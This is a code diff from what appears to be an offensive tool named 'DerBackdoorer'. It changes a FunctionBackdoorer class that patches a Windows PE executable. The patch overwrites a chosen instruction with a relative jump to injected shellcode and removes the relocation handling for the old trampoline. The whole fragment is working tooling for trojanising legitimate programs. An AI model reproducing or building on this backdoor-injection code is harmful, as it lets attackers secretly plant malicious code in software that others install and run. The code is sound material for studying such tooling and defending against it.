@@ -8,11 +8,13 @@ import pefile
 import capstone
 import keystone
 import logging
+from intervaltree import *
 
 from utils import hexdump
 from pe.superpe import SuperPe
 from model.defs import *
-from intervaltree import *
+from pe.pehelper import assemble_relative_call, assemble_relative_jmp
+
 logger = logging.getLogger("DerBackdoorer")
 
 
@@ -40,10 +42,11 @@ class FunctionBackdoorer:
         if addr is None:
             raise Exception("Couldn't find a suitable instruction to backdoor")
 
-        compiled_trampoline, text_trampoline, trampoline_reloc_offset = self.get_trampoline(addr, shellcode_addr)
+        compiled_trampoline = assemble_relative_jmp(addr, shellcode_addr)
         logger.info("--[ Backdoor 0x{:X}: {}".format(
-            addr, text_trampoline))
+            addr, compiled_trampoline.hex()))
         
+        # Check for overlap
         it = IntervalTree()
         it.addi(addr, addr+len(compiled_trampoline))
         if it.overlap(shellcode_addr, shellcode_addr+shellcode_len):
@@ -54,13 +57,6 @@ class FunctionBackdoorer:
 
         # write
         self.superpe.pe.set_bytes_at_rva(addr, bytes(compiled_trampoline))
-
-        # relocs
-        relocs = (
-            addr + trampoline_reloc_offset,
-        )
-        pageRva = 4096 * int((addr + trampoline_reloc_offset) / 4096)
-        self.superpe.addImageBaseRelocations(pageRva, relocs)
 
 
     def find_suitable_instruction_addr(self, startOffset, length=256):
